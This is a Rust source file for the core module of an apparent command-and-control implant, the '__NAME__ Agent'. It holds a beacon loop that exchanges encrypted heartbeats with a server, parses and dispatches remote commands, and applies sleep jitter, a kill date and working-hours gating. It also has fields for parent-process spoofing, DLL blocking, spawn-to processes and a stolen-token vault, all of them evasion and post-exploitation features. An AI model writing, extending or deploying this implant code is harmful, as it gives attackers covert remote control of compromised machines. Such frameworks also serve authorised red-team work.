// __NAME__ Agent — Agent Module
//
// Main agent logic: connection loop, command dispatch, and transport.

use std::time::{SystemTime, UNIX_EPOCH};

use crate::crypto;
use crate::protocol;
use crate::commander;
use crate::jobs::JobsController;
use crate::downloader::Downloader;
use crate::runtime_common;

/// Connector trait — implement for each transport (TCP, HTTP, etc.)
pub trait Connector {
    fn connect(&mut self) -> Result<(), String>;
    fn exchange(&mut self, data: &[u8]) -> Result<Vec<u8>, String>;
    fn disconnect(&mut self);
}

/// Main agent state
pub struct Agent {
    pub active:      bool,
    pub session_key: Vec<u8>,
    pub sleep_ms:    u64,
    pub jitter:      u32,
    pub kill_date:   i64,
    pub work_start:  i32,
    pub work_end:    i32,
    pub connector:   Box<dyn Connector>,
    pub jobs:        JobsController,
    pub downloader:  Downloader,
    pub ppid_spoof:  u32,
    pub block_dlls:  bool,
    pub spawn_to:    String,
    pub token_vault: Vec<crate::commander::TokenEntry>,
    pub next_token_id: i32,
}

impl Agent {
    pub fn new(profile: Vec<u8>, connector: Box<dyn Connector>) -> Self {
        let mut sleep_ms = 5000;
        let mut jitter = 0;
        let mut kill_date = 0;
        let mut work_start = 0;
        let mut work_end = 0;

        let text = String::from_utf8_lossy(&profile);
        for line in text.lines() {
            let Some((key, value)) = line.split_once('=') else { continue; };
            match key.trim() {
                "sleep_ms" => sleep_ms = value.trim().parse().unwrap_or(sleep_ms),
                "jitter" => jitter = value.trim().parse().unwrap_or(jitter),
                "kill_date" => kill_date = value.trim().parse().unwrap_or(kill_date),
                "work_start" => work_start = value.trim().parse().unwrap_or(work_start),
                "work_end" => work_end = value.trim().parse().unwrap_or(work_end),
                _ => {}
            }
        }

        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos()
            .to_le_bytes();
        let mut session_key = Vec::with_capacity(16);
        while session_key.len() < 16 {
            session_key.extend_from_slice(&seed);
        }
        session_key.truncate(16);

        Agent {
            active:      true,
            session_key,
            sleep_ms,
            jitter,
            kill_date,
            work_start,
            work_end,
            connector,
            jobs:        JobsController::new(),
            downloader:  Downloader::new(),
            ppid_spoof:  0,
            block_dlls:  false,
            spawn_to:    String::new(),
            token_vault: Vec::new(),
            next_token_id: 1,
        }
    }

    pub fn run(&mut self) {
        if self.connector.connect().is_err() {
            return;
        }

        while self.active && !self.should_exit() {
            self.wait_for_working_hours();

            let mut beat = Vec::with_capacity(20);
            beat.extend_from_slice(&protocol::WATERMARK.to_le_bytes());
            beat.extend_from_slice(&self.session_key);

            let outbound = match crypto::encrypt(&beat, &self.session_key) {
                Ok(data) => data,
                Err(_) => break,
            };
            let encrypted_response = match self.connector.exchange(&outbound) {
                Ok(resp) => resp,
                Err(_) => break,
            };
            let response = match crypto::decrypt(&encrypted_response, &self.session_key) {
                Ok(data) => data,
                Err(_) => break,
            };

            let mut offset = 0usize;
            while offset + 8 <= response.len() {
                let cmd_code = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap_or([0; 4]));
                offset += 4;
                let data_len = u32::from_le_bytes(response[offset..offset + 4].try_into().unwrap_or([0; 4])) as usize;
                offset += 4;
                if offset + data_len > response.len() {
                    break;
                }
                let data = response[offset..offset + data_len].to_vec();
                offset += data_len;
                let _ = self.dispatch(cmd_code, 0, &data);
            }

            let _ = self.jobs.reap();
            self.sleep_with_jitter();
        }

        self.connector.disconnect();
    }

    /// Dispatch a single command to the appropriate handler.
    pub fn dispatch(&mut self, cmd_code: u32, cmd_id: u32, data: &[u8]) -> Option<Vec<u8>> {
        commander::dispatch(self, cmd_code, cmd_id, data)
    }

    // ── Trivial utility methods ────────────────────────────────────────────────

    /// Sleep for self.sleep_ms adjusted by ±jitter%.
    pub fn sleep_with_jitter(&self) {
        runtime_common::sleep_with_jitter(self.sleep_ms, self.jitter, 0);
    }

    /// Returns true if kill_date has passed.
    pub fn should_exit(&self) -> bool {
        runtime_common::should_exit(self.kill_date)
    }

    /// Block until the current time falls within [work_start, work_end).
    /// If both are 0, returns immediately.
    pub fn wait_for_working_hours(&self) {
        runtime_common::wait_for_working_hours(self.work_start, self.work_end)
    }
}
